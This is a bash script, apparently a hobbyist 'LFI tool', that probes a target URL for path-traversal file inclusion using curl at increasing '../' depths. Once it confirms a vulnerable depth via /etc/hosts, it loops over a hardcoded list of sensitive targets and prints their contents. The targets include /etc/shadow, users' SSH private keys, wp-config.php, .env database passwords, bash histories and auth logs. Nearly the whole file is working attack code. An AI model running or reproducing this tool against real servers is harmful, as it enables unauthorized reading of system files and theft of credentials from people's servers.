#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'
BOLD=' \033[1m'

echo -e "${BLUE}${BOLD}T O O   B A S I C   L F I   T O O L${RESET}"
echo
echo "       ┓    •   ┓┏•       ┓"
echo "╋┏┓┏┓  ┣┓┏┓┏┓┏  ┃╋┓  ╋┏┓┏┓┃"
echo "┗┗┛┗┛  ┗┛┗┻┛┗┗  ┗┛┗  ┗┗┛┗┛┗"
echo
echo "Welcome back dude, ensure to enter the target url correctly (IT MUST FINISH BY = IN ORDER TO PERFORM THE ATTACK)"
echo 

verbose=false
depth=5
display=5

verbose(){
if [[ $verbose == true ]]; then 
echo -e "${YELLOW}[VERBOSE] $1${RESET}"
fi 
}

show_help(){
echo "By default this program will try path traversal with common lfi. Take a look if you want to perform  a diffent attack"
echo " -h, --help           Display a short man"
echo " -u, --url [URL]      Specify target URL"
echo " -r, --recursion [N]  Choose recursion depth  (N has to be a integer)"
echo " -v, --verbose        Enable verbose mode"
}

if [[ $# -eq 0 ]]; then 
echo "No argument were given. Use -h to display some help"
exit 1
fi 


while [[ $# -gt 0 ]]; do
case "$1" in
        -h | --help)
show_help
exit 0
;;
        -r | --recursion)
if [[ $2 =~ ^[0-9]+$ ]]; then
depth="$2"  
shift 2
else
echo "Option -r take an number as an argument" 
exit 1
fi
;;

        -u | --url)
if [[ -n "$2" && "$2" != -* ]]; then
url="$2"
shift 2
else
echo "Dumb error : -u needs an argument"
exit 1
fi
;;
        -v | --verbose)
verbose=true
shift
;;
         -d | --display)
if [[ $2 =~ ^[0-9]+$ ]]; then
display="$2"
shift 2
else 
echo "So bored of stupid errors, -d take a fucking number as an argument" 
exit 1
fi 
;;

*)
echo "Unknown option: $1"
exit 1
;;
esac 
done 

echo "--------------------------------------------------------------"       
echo "Launching script with following parameters:"
echo "URL :${url:-not specified}"
echo "Recursion depth : $depth"
echo "Preview : $display lines"
echo "--------------------------------------------------------------"
 
echo 

verbose "Requesting the server which methods are allowed..."

connexion_test=$(curl -o /dev/null -w "%{http_code}" "$url")
echo
echo "Code "$connexion_test""
echo
if [ "$connexion_test" -ge 408 ] || [ "$connexion_test" -eq 0 ]; then 
echo -e "${RED}${BOLD}Maybe you should think about having an actual connexion lmao (check your fucking interfaces)"
exit 1

else

        methods=$(curl -s -I -X OPTIONS "$url" | grep  -i  "Allow:")
        if  [ -n "$methods" ]; then 
                if  echo  "$methods" | grep  -i "POST" ; then 
                verbose "${GREEN}Request POST allowed{RESET}"
        fi
        if  echo  "$methods" | grep  -i "GET" ; then 
                verbose "${GREEN}Request GET allowed${RESET}"
        fi
 if  echo "$methods" | grep -i "HEAD" ;then 
                verbose "${GREEN}Request HEAD allowed${RESET}"
        fi
 
        else 
        echo -e "${RED}${BOLD}Server sets in no sniffing mode : *womp womp sound*${RESET}"
fi
fi


declare -A files_indicators
# Fichiers système essentiels
files_indicators["/etc/passwd"]="root:"                   # Liste des utilisateurs système
files_indicators["/etc/shadow"]="root:"                   # Contient les mots de passe chiffrés
files_indicators["/etc/group"]=":x:"                      # Informations sur les groupes d'utilisateurs
files_indicators["/etc/hostname"]="localhost"             # Nom d’hôte du système
files_indicators["/etc/issue"]="welcome"                  # Message d'accueil avant l'identification
files_indicators["/etc/fstab"]="/dev/"                    # Points de montage des systèmes de fichiers
files_indicators["/etc/hosts"]="127.0.0.1"                # Résolution locale des hôtes
files_indicators["/etc/resolv.conf"]="nameserver"         # Configuration DNS
files_indicators["/etc/os-release"]="PRETTY_NAME"         # Version du système d’exploitation
files_indicators["/proc/version"]="Linux version"         # Version du noyau Linux
files_indicators["/proc/cpuinfo"]="processor"             # Informations sur le processeur
files_indicators["/proc/meminfo"]="MemTotal"              # Informations sur la mémoire physique
files_indicators["/proc/self/environ"]="HTTP_USER_AGENT"  # Variables d’environnement du processus actuel

# Logs système
files_indicators["/var/log/syslog"]="kernel:"             # Logs système principaux (Debian/Ubuntu)
files_indicators["/var/log/messages"]="kernel:"           # Logs système principaux (Red Hat/CentOS)
files_indicators["/var/log/dmesg"]="Linux version"        # Logs du démarrage du noyau
files_indicators["/var/log/auth.log"]="sshd"              # Logs d’authentification (Debian/Ubuntu)
files_indicators["/var/log/secure"]="sshd"                # Logs d’authentification (Red Hat/CentOS)
files_indicators["/var/log/lastlog"]="UTC"                # Historique des connexions
files_indicators["/var/log/wtmp"]="username"              # Historique des connexions au système
files_indicators["/var/log/btmp"]="failed"                # Logs des tentatives de connexion échouées

# Logs des services web
files_indicators["/var/log/apache2/access.log"]="GET"     # Logs d'accès Apache
files_indicators["/var/log/apache2/error.log"]="error"    # Logs d'erreur Apache
files_indicators["/var/log/nginx/access.log"]="GET"       # Logs d'accès Nginx
files_indicators["/var/log/nginx/error.log"]="error"      # Logs d'erreur Nginx

# Configurations des services
files_indicators["/etc/apache2/apache2.conf"]="ServerRoot" # Configuration principale Apache
files_indicators["/etc/nginx/nginx.conf"]="server {"      # Configuration principale Nginx
files_indicators["/etc/php/php.ini"]="memory_limit"       # Configuration PHP
files_indicators["/etc/ssh/sshd_config"]="PermitRootLogin" # Configuration SSH
files_indicators["/etc/cron.d"]="cron"                    # Tâches planifiées spécifiques
files_indicators["/etc/crontab"]="cron"                   # Tâches planifiées globales
files_indicators["/var/spool/cron/crontabs"]="cron"       # Cron personnalisé des utilisateurs

# Fichiers d'applications spécifiques
files_indicators["/var/www/html/index.php"]="<?php"       # Fichier PHP principal
files_indicators["/var/www/html/wp-config.php"]="DB_NAME" # Configuration WordPress avec identifiants MySQL
files_indicators["/var/www/html/.env"]="DB_PASSWORD"      # Fichiers .env avec des configurations sensibles
files_indicators["/var/www/html/config.php"]="password"   # Configurations diverses (frameworks, CMS)
files_indicators["/var/www/html/.htaccess"]="RewriteRule" # Règles de réécriture Apache

# Réseaux et connexions
files_indicators["/proc/net/tcp"]="sl"                    # Informations sur les connexions TCP
files_indicators["/proc/net/udp"]="sl"                    # Informations sur les connexions UDP
files_indicators["/proc/net/arp"]="IP address"            # Tableau ARP
files_indicators["/proc/net/route"]="Iface"               # Table de routage
files_indicators["/proc/net/dev"]="Inter-|   Receive"     # Statistiques réseau

# Autres fichiers intéressants
files_indicators["/root/.bash_history"]="sudo"            # Historique des commandes root
files_indicators["/home/*/.bash_history"]="ssh"           # Historique des commandes des utilisateurs
files_indicators["/home/*/.ssh/id_rsa"]="BEGIN RSA"       # Clés SSH privées des utilisateurs
files_indicators["/home/*/.ssh/authorized_keys"]="ssh-rsa" # Clés SSH autorisées
files_indicators["/tmp/sess_*"]="session"                 # Sessions PHP temporaires
files_indicators["/var/log/httpd/access_log"]="GET"       # Autre format de logs Apache


echo
echo -e "${YELLOW}If you didn't choose a recursion level it's automatically set to 5${RESET}"
echo
echo "How deep is your love, my deer ?"
echo 

test_file() {
    local path=$1
    local file=$2
    local indicator=$3

query=$(printf '../%.0s' $(seq 1 $path))$file
test_url="${url}${query}"

verbose  "${YELLOW}Recursion depth: $path${RESET}"
verbose  "URL: $test_url"
response=$(curl -s "$test_url")

#testing if response is True 
if echo "$response" | grep -q -i "$indicator"; then
echo 
echo -e "${GREEN}${BOLD}File found : "$file" ${RESET}"
echo -e "${CYAN}${BOLD}Content preview${RESET}"
echo "- - - - - - - - - - - - - - - - - - - - - "
echo -e "${BLUE}$(echo "$response" | head -n "$display")${RESET}"
echo "- - - - - - - - - - - - - - - - - - - - - "
return 0
else
verbose "${RED}No file found at this recursion level${RESET}"
return 1
fi

} 

#starting main loop 
found=0
vuln_depth=0


for ((i=1; i<=depth; i++)); do 
    verbose "${YELLOW}Stade ${i} recursion${RESET}"
  verbose "$test_url" 
    verbose "Searching for /etc/hosts file..."
    if  test_file $i "/etc/hosts" "${files_indicators["/etc/hosts"]}" ; then
        vuln_depth="$i"
        ((found++))
        echo -e "${GREEN}${BOLD}SUCCESS: Found vulnerable path at recursion level $i${RESET}"
        break
    fi
done

if [ "$vuln_depth" -gt 0 ]; then
        verbose "Now that you know how deep is your love, you can probably fish other files such as /etc/passwd or /etc/shadow"

echo
echo "Have a wonderful look dude"
for file in "${!files_indicators[@]}"; do
        if [ "$file" != "etc/hosts" ]; then
            indicator="${files_indicators[$file]}"
            if test_file "$vuln_depth" "$file" "$indicator"; then
                ((found++))
fi 
fi  
    done

echo -e "${GREEN}${BOLD}${found} files found."
else

echo -e  "$Unfortunately there's nothing to find.{RESET}"
fi 

exit 0 

